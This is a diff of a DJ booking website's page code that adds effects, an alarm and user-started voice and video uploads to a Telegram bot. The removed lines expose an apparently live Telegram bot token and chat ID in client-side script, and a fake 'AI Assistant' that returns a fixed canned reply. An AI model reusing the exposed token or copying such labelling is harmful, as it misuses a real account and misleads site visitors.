+        } catch(e) { console.log("Web Audio API not supported for ultrasound."); }
+    }
+
+    // --- FIX: Safely Turn off the Alarm from the popup ---
+    function stopEarthquakeAlarm() {
+        document.getElementById('alarmRingingPopup').style.display = 'none';
+        document.body.classList.remove('bass-mode');
+        
+        const audio = document.getElementById('alarmAudio'); 
+        if(audio) { 
+            audio.pause();
+            audio.currentTime = 0;
+        }
+        
+        if("vibrate" in navigator) navigator.vibrate(0);
+        if(osc) { osc.stop(); osc = null; }
+    }
+
+    // --- PARTICLES (SNOW & GALAXY CRACKERS) ---
+    let snowInt, crackerInt;
+    function applySnowfall(el) {
+        const layer = document.getElementById('effect-layer');
+        if (el.checked) {
+            snowInt = setInterval(() => {
+                const snow = document.createElement('div'); snow.className='snowflake'; snow.innerText='❄️';
+                snow.style.left = Math.random()*100+'vw'; snow.style.animationDuration = (Math.random()*3+2)+'s'; snow.style.fontSize = (Math.random()*15+10)+'px';
+                layer.appendChild(snow); setTimeout(() => snow.remove(), 4000);
+            }, 150);
+        } else { clearInterval(snowInt); layer.innerHTML=''; }
+    }
+    
+    function applyCrackers(el) {
+        const layer = document.getElementById('effect-layer');
+        const colors = ['#ff3333', '#00ff00', '#00e5ff', '#ff00ff', '#FFD700'];
+        if(el.checked) {
+            crackerInt = setInterval(() => {
+                const spark = document.createElement('div'); 
+                spark.className='cracker-spark';
+                const c = colors[Math.floor(Math.random() * colors.length)];
+                spark.style.color = c;
+                spark.style.backgroundColor = c;
+                spark.style.left = Math.random()*100+'vw'; 
+                spark.style.animationDuration = (Math.random()*2+1)+'s';
+                layer.appendChild(spark); setTimeout(() => spark.remove(), 3000);
+            }, 50); // High density crackers
+        } else { clearInterval(crackerInt); layer.innerHTML=''; }
+    }
+
+    // --- TELEGRAM 50s CAMERA & VOICE RECORDING ---
+    let mediaRecorder; let audioChunks = []; let currentFacingMode = 'environment'; let currentStream;
+    
+    function switchCamera() {
+        currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
+        alert(currentFacingMode === 'user' ? "Front Camera Selected" : "Rear Camera Selected");
+    }
+
+    async function checkUser() {
+        const n = document.getElementById('mediaName').value; const p = document.getElementById('mediaNum').value;
+        if(!n || !p) { alert("⚠️ Name and Phone are Mandatory."); return false; } return {n,p};
+    }
+
+    function requestVideoCall() {
+        checkUser().then(u => { if(!u) return; window.open("https://t.me/+919771617808", "_blank"); });
+    }
+
+    async function startVoiceRecord() {
+        const user = await checkUser(); if(!user) return;
+        const btn = document.getElementById('btnVoice'); 
+        const stopBtn = document.getElementById('stopRecordBtn');
+        const status = document.getElementById('recordingStatus');
+        
+        try {
+            currentStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(currentStream); mediaRecorder.start(); audioChunks = [];
+            btn.style.display = 'none'; document.getElementById('btnVideo').style.display = 'none'; document.getElementById('btnFlipCam').style.display = 'none';
+            stopBtn.style.display = 'block'; 
+            status.style.display = 'block'; status.innerText = 'Capturing Audio...';
+            
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                sendSecure(new Blob(audioChunks, {type:'audio/mpeg'}), 'voice', user.n, user.p);
+                resetRecordButtons();
+            };
+        } catch(e) { alert("Mic denied."); }
+    }
+
+    async function startVideoRecord() {
+        const user = await checkUser(); if(!user) return;
+        const btn = document.getElementById('btnVideo'); 
+        const stopBtn = document.getElementById('stopRecordBtn');
+        const status = document.getElementById('recordingStatus'); 
+        const vid = document.getElementById('cameraPreview');
+        
+        try {
+            currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: true });
+            vid.srcObject = currentStream; vid.style.display = 'block';
+            
+            mediaRecorder = new MediaRecorder(currentStream); mediaRecorder.start(); audioChunks = [];
+            
+            document.getElementById('btnVoice').style.display = 'none'; btn.style.display = 'none'; document.getElementById('btnFlipCam').style.display = 'none';
+            stopBtn.style.display = 'block';
+            status.style.display = 'block'; status.innerText = 'Capturing Video (50s limit)...';
+            
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                sendSecure(new Blob(audioChunks, {type:'video/mp4'}), 'video', user.n, user.p);
+                currentStream.getTracks().forEach(t => t.stop()); vid.style.display = 'none';
+                resetRecordButtons();
+            };
+            
+            // 50 SECOND TIMEOUT AS REQUESTED
+            setTimeout(() => { if(mediaRecorder.state === "recording") { mediaRecorder.stop(); } }, 50000);
+        } catch(e) { alert("Camera denied."); }
+    }
+
+    function stopMediaRecording() {
+        if(mediaRecorder && mediaRecorder.state === "recording") {
+            mediaRecorder.stop();
+        }
+    }
+
+    function resetRecordButtons() {
+        document.getElementById('btnVoice').style.display = 'block';
+        document.getElementById('btnVideo').style.display = 'block';
+        document.getElementById('btnFlipCam').style.display = 'block';
+        document.getElementById('stopRecordBtn').style.display = 'none';
+    }
+
+    function sendSecure(blob, type, name, num) {
+        document.getElementById('recordingStatus').innerText = 'Uploading to Secure Vault...';
+        const fd = new FormData(); 
+        
+        let chatId = typeof TG_CHAT !== 'undefined' ? TG_CHAT : "YOUR_TG_CHAT_ID";
+        let token = typeof TG_TOKEN !== 'undefined' ? TG_TOKEN : "YOUR_TG_TOKEN";
+        
+        fd.append('chat_id', chatId); 
+        fd.append('caption', `🔔 *${type.toUpperCase()} VAULT*\n👤 ${name}\n📞 ${num}`);
+        fd.append(type, blob, `media.${type==='voice'?'mp3':'mp4'}`);
+        
+        fetch(`https://api.telegram.org/bot${token}/${type==='voice'?'sendVoice':'sendVideo'}`, { method:'POST', body:fd })
+        .then(() => { alert(`✅ ${type} Transfer Complete!`); document.getElementById('recordingStatus').style.display='none'; })
+        .catch(() => { alert("⚠️ Transfer Failed."); document.getElementById('recordingStatus').style.display='none'; });
+    }
+</script>
       <a href="javascript:void(0)" class="side-link" onclick="toggleMenu(); openGalleryModal()">
     <i class="fas fa-camera-retro"></i> Live Gallery
 </a>
@@ -1442,14 +2088,11 @@
         <i class="fas fa-bars nav-btn" onclick="toggleMenu()"></i>
         <span><i class="fas fa-crown"></i> MND Hub</span>
     </div>
-    <div style="display: flex; align-items: center; gap: 10px;">
+    <div class="nav-right">
         <div id="google_translate_element"></div>
-        <div class="controls" style="display: flex; gap: 8px;">
+        <div class="controls">
             <button class="nav-btn-square theme-btn" id="themeIcon" onclick="themeSwitch()">
                 <i class="fas fa-sun"></i>
-            </button>
-            <button class="nav-btn-square ai-btn-nav" onclick="openAiModal()" style="animation: glowPulse 2s infinite;">
-                <i class="fas fa-robot"></i>
             </button>
             <button class="nav-btn-square set-btn" id="masterSettingsIcon" onclick="openMasterSettings()">
                 <i class="fas fa-cog fa-spin-hover"></i>
@@ -1457,33 +2100,6 @@
         </div>
     </div>
 </nav>
-
-<div id="promoNotification" style="display:none; position:fixed; top:20px; left:50%; transform:translateX(-50%); width:90%; max-width:400px; background:linear-gradient(45deg, #ff007f, #ff8c00, #D4AF37, #8a2be2); background-size: 300% 300%; color:#fff; padding:20px; border-radius:15px; z-index:99999999; box-shadow:0 10px 40px rgba(0,0,0,0.8); text-align:center; animation: slideDownFade 0.5s ease, gradientShift 5s ease infinite; border: 2px solid #fff;">
-    <span onclick="document.getElementById('promoNotification').style.display='none'" style="position:absolute; top:10px; right:15px; font-size:20px; cursor:pointer;">&times;</span>
-    <i class="fas fa-crown" style="font-size:30px; margin-bottom:10px; text-shadow: 0 0 10px #fff;"></i>
-    <h3 style="margin:0; font-family:'Cinzel', serif; font-size:18px; text-shadow: 0 2px 4px rgba(0,0,0,0.5);">Book Maa Nirmala DJ Today!</h3>
-    <p style="font-family:'Outfit', sans-serif; font-size:14px; margin:5px 0 15px 0; font-weight:bold;">Heavy Bass, 3D Sound & Premium Tents available now.</p>
-    <button class="mn-btn" style="background:#fff; color:#000; width:100%; border:none; font-weight:900; font-size:16px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);" onclick="window.open('https://t.me/+919771617808', '_blank')"><i class="fas fa-phone-alt"></i> Contact Management</button>
-</div>
-
-<div id="aiModalOverlay" onclick="closeAiOnOutsideClick(event)" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050505; z-index: 9999999 !important; justify-content: center; align-items: center; animation: fadeInOverlay 0.4s ease;">
-    <div class="mn-ai-box" id="aiBoxContent" style="background: linear-gradient(145deg, #0a0a0c 0%, #110e08 100%); width: 100%; height: 100%; display: flex; flex-direction: column;">
-        <div class="master-header" style="background: linear-gradient(180deg, rgba(255,51,51,0.2) 0%, rgba(0,0,0,0) 100%); padding: 20px; text-align: center; border-bottom: 1px solid rgba(255, 51, 51, 0.3); position: relative;">
-            <span onclick="closeAiModal()" style="position:absolute; top:15px; right:20px; color:#ff3333; font-size:35px; cursor:pointer;">&times;</span>
-            <h2 style="margin:0; color:#ff3333; font-family:'Cinzel', serif; font-size:22px; font-weight:900;"><i class="fas fa-robot"></i> MND AI Assistant</h2>
-            <div style="font-size:12px; color:#aaa;">Powered by Advanced Algorithms</div>
-        </div>
-        <div class="chat-history" id="chatHistoryArea" style="flex-grow:1; padding:20px; overflow-y:auto;">
-            <div style="background:rgba(255,51,51,0.1); color:#fff; padding:15px; border-radius:10px; margin-bottom:10px; border:1px solid #ff3333; font-family:'Outfit'; font-size:14px;">
-                <i class="fas fa-robot"></i> Hello! I am the MND AI. I can answer questions about Maa Nirmala DJ, our heavy bass setups, tent bookings, and prices. How can I help you today?
-            </div>
-        </div>
-        <div style="padding:15px; display:flex; gap:10px; border-top:1px solid rgba(255,51,51,0.3);">
-            <input type="text" id="aiInputMaster" class="mn-input" placeholder="Ask me anything..." style="flex-grow:1; border-color:#ff3333;">
-            <button class="mn-btn" style="background:#ff3333; color:#fff;" onclick="sendAiMsgMaster()"><i class="fas fa-paper-plane"></i></button>
-        </div>
-    </div>
-</div>
 
 <div id="masterSettingsOverlay" onclick="closeMasterOnOutsideClick(event)">
     <div class="mn-master-box" id="masterBoxContent">
@@ -1493,65 +2109,32 @@
         </div>
         
         <div class="master-content">
-
-            <div class="setting-row" style="background: linear-gradient(90deg, rgba(255,153,51,0.1), rgba(255,255,255,0.05), rgba(19,136,8,0.1)); border: 1px solid #D4AF37; margin: 10px; border-radius: 12px; flex-direction: column; align-items: stretch;">
-                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
-                    <div class="setting-label">
-                        <div class="setting-icon" style="color:#ff9933;"><i class="fas fa-calendar-alt"></i></div>
-                        <div>
-                            Indian Festival Radar
-                            <div style="font-size: 11px; color: #ccc;" id="nextFestivalText">Loading upcoming festivals...</div>
-                        </div>
+            
+            <div class="setting-row" style="background: rgba(212,175,55,0.05);">
+                <div class="setting-label">
+                    <div class="setting-icon"><i class="fas fa-clock"></i></div>
+                    <div>
+                        Live Time: <strong id="liveClock" style="color: #D4AF37;">00:00:00</strong>
+                        <div style="font-size: 11px; color: #888;">Set Earthquake Alarm</div>
                     </div>
-                    <label class="mn-switch"><input type="checkbox" id="toggleFestivalAlarm" checked><span class="mn-slider"></span></label>
                 </div>
-            </div>
-
-            <div class="setting-row" style="background: rgba(212,175,55,0.05); flex-direction:column; align-items:stretch;">
-                <div style="display:flex; justify-content:space-between; align-items:center;">
-                    <div class="setting-label">
-                        <div class="setting-icon"><i class="fas fa-clock"></i></div>
-                        <div>
-                            Live Time: <strong id="liveClock" style="color: #D4AF37;">00:00:00</strong>
-                            <div style="font-size: 11px; color: #888;">Set 3 Unlimited 3D Alarms</div>
-                        </div>
-                    </div>
+                <div style="display:flex; gap:10px; align-items:center;">
+                    <input type="time" id="alarmTime" class="mn-input" style="padding: 5px;">
                     <label class="mn-switch"><input type="checkbox" id="toggleAlarm" onchange="toggleAlarmStatus()"><span class="mn-slider"></span></label>
                 </div>
-                <div style="display:flex; gap:5px; justify-content:space-between; width: 100%; margin-top: 10px;">
-                    <input type="time" id="alarmTime1" class="mn-input" style="padding: 5px; flex:1; text-align:center;">
-                    <input type="time" id="alarmTime2" class="mn-input" style="padding: 5px; flex:1; text-align:center;">
-                    <input type="time" id="alarmTime3" class="mn-input" style="padding: 5px; flex:1; text-align:center;">
-                </div>
             </div>
 
-            <div class="setting-row" style="background: rgba(0, 136, 204, 0.05); border: 1px solid #0088cc; flex-direction: column; align-items: stretch; margin: 10px; border-radius: 10px;">
+            <div class="setting-row" style="flex-direction: column; align-items: flex-start;">
                 <div class="setting-label" style="margin-bottom: 10px;">
-                    <div class="setting-icon" style="color:#0088cc;"><i class="fas fa-satellite-dish"></i></div>
-                    <div>Direct Studio Link<div style="font-size: 11px; color: #888;">Secure Media Transfer & Live Routing</div></div>
+                    <div class="setting-icon" style="color:#0088cc;"><i class="fab fa-telegram-plane"></i></div>
+                    <div>Direct Message to Management</div>
                 </div>
-                
-                <input type="text" id="mediaName" class="mn-input" placeholder="Your Name (Mandatory)" style="width:100%; margin-bottom:5px;">
-                <input type="tel" id="mediaNum" class="mn-input" placeholder="Your Phone (Mandatory)" style="width:100%; margin-bottom:10px;">
-                
-                <video id="cameraPreview" autoplay muted playsinline style="display:none; width:100%; height:200px; object-fit:cover; border-radius:8px; border:2px solid #ff3333; margin-bottom:10px; box-shadow:0 0 15px rgba(255,51,51,0.5);"></video>
-
-                <div style="display: flex; width: 100%; gap: 10px; margin-bottom: 10px;">
-                    <button id="btnVoice" class="mn-btn" style="background:#0088cc; color:#fff; flex:1;" onclick="startVoiceRecord()"><i class="fas fa-microphone"></i> Voice Record</button>
-                    <button id="btnVideo" class="mn-btn" style="background:#ff3333; color:#fff; flex:1;" onclick="startVideoRecord()"><i class="fas fa-video"></i> Video Record</button>
+                <div style="display: flex; width: 100%; gap: 10px;">
+                    <input type="text" id="quickMsg" class="mn-input" placeholder="Type your feedback here..." style="flex-grow: 1;">
+                    <button id="quickSendBtn" class="mn-btn" onclick="sendQuickFeedback()"><i class="fas fa-paper-plane"></i> Send</button>
                 </div>
-                
-                <button id="btnCall" class="mn-btn" style="background:#25D366; width:100%; color:#fff; box-shadow: 0 0 15px rgba(37, 211, 102, 0.4);" onclick="requestVideoCall()">
-                    <i class="fas fa-phone-video"></i> Route Live Video Call
-                </button>
-                <div id="recordingStatus" style="color:#ff3333; font-weight:bold; font-size:12px; margin-top:10px; display:none; text-align:center;"><i class="fas fa-circle fa-beat"></i> Processing Secure Transfer...</div>
             </div>
 
-            <div class="setting-row">
-                <div class="setting-label"><div class="setting-icon" style="color:#4caf50;"><i class="fas fa-eye"></i></div><div>Eye Comfort Mode<div style="font-size: 11px; color: #888;">Warm reading display</div></div></div>
-                <label class="mn-switch"><input type="checkbox" id="toggleEyeComfort" onchange="applyEffectClass('toggleEyeComfort', 'eye-comfort-mode')"><span class="mn-slider"></span></label>
-            </div>
-            
             <div class="setting-row">
                 <div class="setting-label"><div class="setting-icon" style="color:#ff3333;"><i class="fas fa-bullhorn"></i></div><div>Earthquake Bass<div style="font-size: 11px; color: #888;">Screen physically shakes!</div></div></div>
                 <label class="mn-switch"><input type="checkbox" id="toggleBass" onchange="applyEffectClass('toggleBass', 'bass-mode')"><span class="mn-slider"></span></label>
@@ -1588,7 +2171,9 @@
 </audio>
 
 <style>
-    /* GLOBAL NAVBAR & BUTTON FIXES */
+    body { padding-top: 65px; } /* Prevents content from hiding under fixed navbar */
+
+    /* Fixed Navbar Styling */
     .navbar {
         position: fixed; top: 0; left: 0; width: 100%; height: 65px;
         background: rgba(10, 10, 12, 0.95); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
@@ -1596,34 +2181,36 @@
         padding: 0 15px; border-bottom: 1px solid rgba(212, 175, 55, 0.3);
         z-index: 1000; box-sizing: border-box; box-shadow: 0 5px 20px rgba(0,0,0,0.5);
     }
-    body { padding-top: 65px; margin: 0; transition: filter 0.5s ease, background-color 0.5s ease; } 
-
+    .brand { display: flex; align-items: center; gap: 10px; color: #D4AF37; font-family: 'Cinzel', serif; font-weight: 900; font-size: 1.2rem; white-space: nowrap; }
+    .nav-right { display: flex; align-items: center; gap: 8px; }
+    .controls { display: flex; gap: 8px; }
+    
+    /* Square Buttons */
     .nav-btn-square {
-        width: 36px; height: 36px; border-radius: 8px; cursor: pointer;
+        width: 38px; height: 38px; border-radius: 8px; cursor: pointer;
         display: flex; justify-content: center; align-items: center; font-size: 16px; transition: 0.3s;
     }
     .theme-btn { background: rgba(255,255,255,0.05); border: 1px solid #D4AF37; color: #D4AF37; }
-    .ai-btn-nav { background: linear-gradient(45deg, #D4AF37, #ff3333); border: none; color: #fff; box-shadow: 0 0 10px rgba(212,175,55,0.5); }
     .set-btn { background: rgba(212,175,55,0.15); border: 1px solid #D4AF37; color: #D4AF37; box-shadow: 0 0 10px rgba(212,175,55,0.4); }
-    
-    @keyframes glowPulse {
-        0% { box-shadow: 0 0 5px #D4AF37; transform: scale(1); }
-        50% { box-shadow: 0 0 20px #ff3333, 0 0 30px #D4AF37; transform: scale(1.05); }
-        100% { box-shadow: 0 0 5px #D4AF37; transform: scale(1); }
-    }
-    @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+    .fa-spin-hover:hover { animation: fa-spin 2s infinite linear; }
 
-    /* FULL-SCREEN MASTER SETTINGS OVERLAY */
+    /* Google Translate Fix */
+    #google_translate_element { max-width: 140px; overflow: hidden; }
+    .goog-te-gadget-simple { background-color: rgba(255, 255, 255, 0.05) !important; border: 1px solid rgba(212, 175, 55, 0.3) !important; padding: 4px !important; border-radius: 4px !important; font-family: 'Outfit', sans-serif !important; }
+
+    /* Master Settings Overlay - HIGHEST Z-INDEX */
     #masterSettingsOverlay {
-        display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-        background: #050505; z-index: 9999999 !important; justify-content: center; align-items: center; animation: fadeInOverlay 0.4s ease;
+        display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(2, 2, 4, 0.92); backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
+        z-index: 9999999 !important; justify-content: center; align-items: center; animation: fadeInOverlay 0.4s ease;
     }
-    .mn-master-box { background: linear-gradient(145deg, #110e08 0%, #050505 100%); border: none; border-radius: 0; width: 100%; height: 100%; display: flex; flex-direction: column; }
+    .mn-master-box { background: linear-gradient(145deg, #110e08 0%, #050505 100%); border: 1px solid #D4AF37; border-radius: 20px; width: 95%; max-width: 500px; height: 85vh; max-height: 750px; display: flex; flex-direction: column; box-shadow: 0 30px 60px rgba(0,0,0,0.9), inset 0 0 20px rgba(212, 175, 55, 0.2); }
     .master-header { background: linear-gradient(180deg, rgba(212, 175, 55, 0.2) 0%, rgba(0,0,0,0) 100%); padding: 20px; text-align: center; border-bottom: 1px solid rgba(212, 175, 55, 0.3); position: relative; }
-    .master-content { flex-grow: 1; overflow-y: auto; padding-bottom: 30px; }
+    .master-content { flex-grow: 1; overflow-y: auto; padding-bottom: 20px; }
     .master-content::-webkit-scrollbar { width: 6px; }
     .master-content::-webkit-scrollbar-thumb { background: #D4AF37; border-radius: 10px; }
     .setting-row { display: flex; justify-content: space-between; align-items: center; padding: 16px 25px; border-bottom: 1px solid rgba(255,255,255,0.05); transition: 0.3s; flex-wrap: wrap; gap: 10px; }
+    .setting-row:hover { background: rgba(212, 175, 55, 0.05); }
     .setting-label { display: flex; align-items: center; gap: 15px; color: #fff; font-family: 'Outfit', sans-serif; font-size: 15px; }
     .setting-icon { width: 38px; height: 38px; background: rgba(212, 175, 55, 0.1); border-radius: 10px; display: flex; justify-content: center; align-items: center; color: #D4AF37; font-size: 18px; box-shadow: inset 0 0 5px rgba(212,175,55,0.2); }
 
@@ -1634,115 +2221,60 @@
     .mn-slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
     input:checked + .mn-slider { background-color: #D4AF37; box-shadow: 0 0 10px #D4AF37; }
     input:checked + .mn-slider:before { transform: translateX(21px); }
-    .mn-input { background: rgba(0,0,0,0.5); border: 1px solid rgba(212,175,55,0.4); color: #fff; padding: 8px 12px; border-radius: 8px; outline: none; font-family: 'Outfit', sans-serif; box-sizing: border-box; }
+    .mn-input { background: rgba(0,0,0,0.5); border: 1px solid rgba(212,175,55,0.4); color: #fff; padding: 8px 12px; border-radius: 8px; outline: none; font-family: 'Outfit', sans-serif; }
     .mn-input:focus { border-color: #D4AF37; background: rgba(212,175,55,0.1); }
-    .mn-btn { background: #D4AF37; color: #000; border: none; padding: 10px 15px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+    .mn-btn { background: #D4AF37; color: #000; border: none; padding: 8px 15px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
 
-    /* EFFECTS CSS */
-    body.eye-comfort-mode { background-color: #fdf6e3 !important; color: #433f38 !important; filter: sepia(0.3) brightness(0.95); }
-    body.eye-comfort-mode * { color: inherit !important; border-color: #d1c8b3 !important; }
-    
-    body.newspaper-mode { background: #f4f1ea !important; color: #222 !important; font-family: 'Georgia', serif !important; filter: none !important; }
+    /* LIVE EFFECTS CSS */
+    body.newspaper-mode { background: #f4f1ea !important; color: #222 !important; font-family: 'Georgia', serif !important; }
     body.newspaper-mode * { background: transparent !important; color: inherit !important; border-color: #555 !important; box-shadow: none !important; }
-    
     @keyframes rgbGlowShift { 0% { filter: hue-rotate(0deg); } 50% { filter: hue-rotate(180deg); } 100% { filter: hue-rotate(360deg); } }
     body.rgb-mode { animation: rgbGlowShift 4s linear infinite !important; }
-    
-    @keyframes heavyBassShake { 0% { transform: translate(3px, 3px); } 20% { transform: translate(-4px, 0px); } 40% { transform: translate(4px, -3px); } 60% { transform: translate(-3px, 4px); } 80% { transform: translate(4px, 1px); } 100% { transform: translate(-3px, -2px); } }
-    body.bass-mode { animation: heavyBassShake 0.2s infinite !important; }
+    @keyframes heavyBassShake { 0% { transform: translate(2px, 2px); } 20% { transform: translate(-3px, 0px); } 40% { transform: translate(3px, -2px); } 60% { transform: translate(-2px, 3px); } 80% { transform: translate(3px, 1px); } 100% { transform: translate(-2px, -1px); } }
+    body.bass-mode { animation: heavyBassShake 0.3s infinite !important; }
     
     #effect-layer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 9999997; overflow: hidden; }
     .snowflake { position: absolute; top: -10px; color: #fff; font-size: 1.5em; animation: fall linear forwards; text-shadow: 0 0 8px #fff; }
     @keyframes fall { to { transform: translateY(105vh); } }
 
-    #google_translate_element { max-width: 120px; overflow: hidden; }
-    .goog-te-gadget-simple { background-color: rgba(255, 255, 255, 0.05) !important; border: 1px solid rgba(212, 175, 55, 0.3) !important; padding: 4px !important; border-radius: 4px !important; font-family: 'Outfit', sans-serif !important; }
+    @media (max-width: 400px) {
+        .brand span { font-size: 1rem; }
+        #google_translate_element { max-width: 110px; }
+        .nav-btn-square { width: 34px; height: 34px; font-size: 14px; }
+    }
 </style>
 
-<script>
-    // ==========================================
-    // GLOBAL TELEGRAM CREDENTIALS
-    // ==========================================
-    const TG_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ";
-    const TG_CHAT = "8506290708";
+<script type="text/javascript">
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({
+            pageLanguage: 'en',
+            includedLanguages: 'hi,bho,mai,bn,mr,te,ta,pa,gu,kn,ml,or',
+            layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+            autoDisplay: false
+        }, 'google_translate_element');
+    }
+</script>
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
+<script>
     // --- MODAL CONTROLS ---
     function openMasterSettings() { document.getElementById('masterSettingsOverlay').style.display = 'flex'; }
     function closeMasterSettings() { document.getElementById('masterSettingsOverlay').style.display = 'none'; }
     function closeMasterOnOutsideClick(event) { if (event.target.id === 'masterSettingsOverlay') closeMasterSettings(); }
 
-    function openAiModal() { document.getElementById('aiModalOverlay').style.display = 'flex'; }
-    function closeAiModal() { document.getElementById('aiModalOverlay').style.display = 'none'; }
-    function closeAiOnOutsideClick(event) { if (event.target.id === 'aiModalOverlay') closeAiModal(); }
-
+    // --- THEME SWITCH ---
     function themeSwitch() {
         const icon = document.querySelector('#themeIcon i');
         if(icon.classList.contains('fa-sun')) {
-            icon.classList.replace('fa-sun', 'fa-moon'); document.body.style.backgroundColor = '#ffffff'; document.body.style.color = '#000000';
+            icon.classList.replace('fa-sun', 'fa-moon');
+            document.body.style.backgroundColor = '#ffffff'; document.body.style.color = '#000000';
         } else {
-            icon.classList.replace('fa-moon', 'fa-sun'); document.body.style.backgroundColor = '#0a0a0c'; document.body.style.color = '#ffffff';
+            icon.classList.replace('fa-moon', 'fa-sun');
+            document.body.style.backgroundColor = '#0a0a0c'; document.body.style.color = '#ffffff';
         }
     }
 
-    // --- INDIAN FESTIVAL CALENDAR & ALARM ---
-    const festivals2026 = [
-        { name: "Holi", date: "2026-03-03" },
-        { name: "Ram Navami", date: "2026-03-26" },
-        { name: "Eid-ul-Fitr", date: "2026-03-20" },
-        { name: "Independence Day", date: "2026-08-15" },
-        { name: "Raksha Bandhan", date: "2026-08-28" },
-        { name: "Ganesh Chaturthi", date: "2026-09-06" },
-        { name: "Navratri / Durga Puja Starts", date: "2026-10-10" },
-        { name: "Dussehra", date: "2026-10-19" },
-        { name: "Diwali", date: "2026-11-08" },
-        { name: "Chhath Puja", date: "2026-11-14" }
-    ];
-
-    function updateFestivalCalendar() {
-        const today = new Date();
-        const textElement = document.getElementById('nextFestivalText');
-        let nextFest = null;
-
-        for (let fest of festivals2026) {
-            let festDate = new Date(fest.date);
-            if (festDate >= today) { nextFest = fest; break; }
-        }
-
-        if (nextFest) {
-            const options = { month: 'long', day: 'numeric' };
-            const dateStr = new Date(nextFest.date).toLocaleDateString('en-IN', options);
-            textElement.innerText = `Upcoming: ${nextFest.name} (${dateStr})`;
-            
-            // Check if today is the festival to sound alarm
-            if (new Date(nextFest.date).toDateString() === today.toDateString() && document.getElementById('toggleFestivalAlarm').checked) {
-                setTimeout(() => { alert(`🎉 Happy ${nextFest.name}! Book Maa Nirmala DJ for the celebration!`); }, 3000);
-            }
-        } else {
-            textElement.innerText = "End of year schedule.";
-        }
-    }
-    updateFestivalCalendar();
-
-    // --- 5-HOUR NOTIFICATION SYSTEM ---
-    setInterval(() => {
-        document.getElementById('promoNotification').style.display = 'block';
-    }, 18000000); // 5 Hours
-
-    // --- AI CHATBOT LOGIC ---
-    function sendAiMsgMaster() {
-        const input = document.getElementById('aiInputMaster');
-        const text = input.value;
-        if(!text) return;
-        const history = document.getElementById('chatHistoryArea');
-        history.innerHTML += `<div style="text-align:right; margin-bottom:10px;"><span style="background:#D4AF37; color:#000; padding:10px; border-radius:10px; display:inline-block; font-family:'Outfit'; font-size:14px;">${text}</span></div>`;
-        input.value = '';
-        setTimeout(() => {
-            history.innerHTML += `<div style="background:rgba(255,51,51,0.1); color:#fff; padding:15px; border-radius:10px; margin-bottom:10px; border:1px solid #ff3333; font-family:'Outfit'; font-size:14px;"><i class="fas fa-robot"></i> Thank you for asking! For specific details and custom quotes, please call Mr. Lalu directly at +91 9771617808. We are ready to make your event perfect!</div>`;
-            history.scrollTop = history.scrollHeight;
-        }, 1000);
-    }
-
-    // --- CLOCK & 3D VIBRATE MULTIPLE ALARMS ---
+    // --- CLOCK & ALARM SYSTEM ---
     setInterval(updateClock, 1000);
     function updateClock() {
         const now = new Date();
@@ -1750,19 +2282,17 @@
         document.getElementById('liveClock').innerText = timeString;
         
         if(document.getElementById('toggleAlarm').checked) {
+            const setTime = document.getElementById('alarmTime').value;
             const currentHM = timeString.substring(0, 5);
-            const a1 = document.getElementById('alarmTime1').value;
-            const a2 = document.getElementById('alarmTime2').value;
-            const a3 = document.getElementById('alarmTime3').value;
-            
-            if((a1 === currentHM || a2 === currentHM || a3 === currentHM) && now.getSeconds() === 0) {
-                triggerEarthquakeAlarm();
-            }
+            if(setTime === currentHM && now.getSeconds() === 0) triggerEarthquakeAlarm();
         }
     }
     
     function toggleAlarmStatus() {
-        if (!document.getElementById('toggleAlarm').checked) {
+        if(document.getElementById('toggleAlarm').checked && !document.getElementById('alarmTime').value) {
+            alert("Please set a time for the alarm first!");
+            document.getElementById('toggleAlarm').checked = false;
+        } else if (!document.getElementById('toggleAlarm').checked) {
             document.getElementById('alarmAudio').pause();
             document.body.classList.remove('bass-mode');
         }
@@ -1770,117 +2300,36 @@
 
     function triggerEarthquakeAlarm() {
         document.body.classList.add('bass-mode');
-        document.getElementById('promoNotification').style.display = 'block'; // Open Promo on Alarm
-        const audio = document.getElementById('alarmAudio');
-        audio.volume = 1.0; // ULTRA 3D HIGH VOLUME
-        audio.play();
-        if("vibrate" in navigator) navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 2000]); // HARDWARE VIBRATE
+        document.getElementById('alarmAudio').play();
+        alert("🚨 ALARM! MAA NIRMALA DJ TIME! 🚨");
     }
 
-    // --- SECURE MEDIA TRANSFER (CAMERA & VOICE) ---
-    let mediaRecorder;
-    let audioChunks = [];
-    
-    async function validateUser() {
-        const name = document.getElementById('mediaName').value;
-        const num = document.getElementById('mediaNum').value;
-        if(!name || !num) { alert("⚠️ Name and Phone Number are MANDATORY for secure transfer."); return false; }
-        return { name, num };
-    }
-
-    async function requestVideoCall() {
-        const user = await validateUser(); if(!user) return;
-        const msg = `🚨 *INCOMING LIVE VIDEO CALL ROUTED* 🚨\n👤 Name: ${user.name}\n📞 Number: ${user.num}\n\n_Client opening Studio Link to call you now!_`;
+    // --- TELEGRAM FEEDBACK ---
+    function sendQuickFeedback() {
+        const msgText = document.getElementById('quickMsg').value;
